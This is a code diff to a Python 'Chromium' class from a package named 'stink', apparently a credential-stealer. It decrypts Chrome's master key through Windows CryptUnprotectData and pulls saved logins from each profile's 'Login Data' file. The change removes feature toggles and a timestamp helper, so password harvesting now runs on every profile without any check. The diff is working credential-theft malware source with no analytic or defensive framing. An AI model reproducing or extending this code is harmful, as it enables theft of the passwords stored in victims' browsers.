@@ -1,6 +1,5 @@
 from base64 import b64decode
 from ctypes import windll, byref, cdll, c_buffer
-from datetime import datetime, timedelta
 from json import loads
 from os import path, listdir
 from re import compile
@@ -8,7 +7,6 @@ from sqlite3 import connect, Connection, Cursor
 from subprocess import run, CREATE_NEW_CONSOLE, SW_HIDE
 from typing import Tuple, List
 
-from stink.enums.features import Features
 from stink.helpers import AESModeOfOperationGCM, DataBlob, MemoryStorage
 from stink.helpers.config import ChromiumConfig
 
@@ -19,13 +17,12 @@ class Chromium:
     """
 
     def __init__(
-        self, browser_name: str, browser_path: str, process_name: str, statuses: List
+            self, browser_name: str, browser_path: str, process_name: str
     ):
         self.__browser_name = browser_name
         self.__state_path = path.join(browser_path, "Local State")
         self.__browser_path = browser_path
         self.__process_name = process_name
-        self.__statuses = statuses
         self.__profiles = None
 
         self.__storage = MemoryStorage()
@@ -81,12 +78,12 @@ class Chromium:
         Returns:
         - None.
         """
-        if path.exists(self.__browser_path) and any(self.__statuses):
+        if path.exists(self.__browser_path):
             self.__profiles = self._get_profiles()
 
     @staticmethod
     def _crypt_unprotect_data(
-        encrypted_bytes: b64decode, entropy: bytes = b""
+            encrypted_bytes: b64decode, entropy: bytes = b""
     ) -> bytes:
         """
         Decrypts data previously encrypted using Windows CryptProtectData function.
@@ -101,18 +98,18 @@ class Chromium:
         blob = DataBlob()
 
         if windll.crypt32.CryptUnprotectData(
-            byref(
-                DataBlob(
-                    len(encrypted_bytes),
-                    c_buffer(encrypted_bytes, len(encrypted_bytes)),
-                )
-            ),
-            None,
-            byref(DataBlob(len(entropy), c_buffer(entropy, len(entropy)))),
-            None,
-            None,
-            0x01,
-            byref(blob),
+                byref(
+                    DataBlob(
+                        len(encrypted_bytes),
+                        c_buffer(encrypted_bytes, len(encrypted_bytes)),
+                    )
+                ),
+                None,
+                byref(DataBlob(len(entropy), c_buffer(entropy, len(entropy)))),
+                None,
+                None,
+                0x01,
+                byref(blob),
         ):
             buffer = c_buffer(int(blob.cbData))
             cdll.msvcrt.memcpy(buffer, blob.pbData, int(blob.cbData))
@@ -138,22 +135,6 @@ class Chromium:
         return self._crypt_unprotect_data(
             b64decode(loads(file)["os_crypt"]["encrypted_key"])[5:]
         )
-
-    @staticmethod
-    def _get_datetime(date: int) -> str:
-        """
-        Converts timestamp to date.
-
-        Parameters:
-        - date [int]: Date to be converted.
-
-        Returns:
-        - str: Converted date or error message.
-        """
-        try:
-            return str(datetime(1601, 1, 1) + timedelta(microseconds=date))
-        except:
-            return "Can't decode"
 
     @staticmethod
     def _decrypt(value: bytes, master_key: bytes) -> str:
@@ -265,15 +246,11 @@ class Chromium:
             {
                 "method": self._grab_passwords,
                 "arguments": [profile_name, path.join(profile, "Login Data")],
-                "status": True if Features.passwords in self.__statuses else False,
             },
         ]
 
         for function in functions:
             try:
-                if function["status"] is False:
-                    continue
-
                 function["method"](*function["arguments"])
 
             except Exception as e:
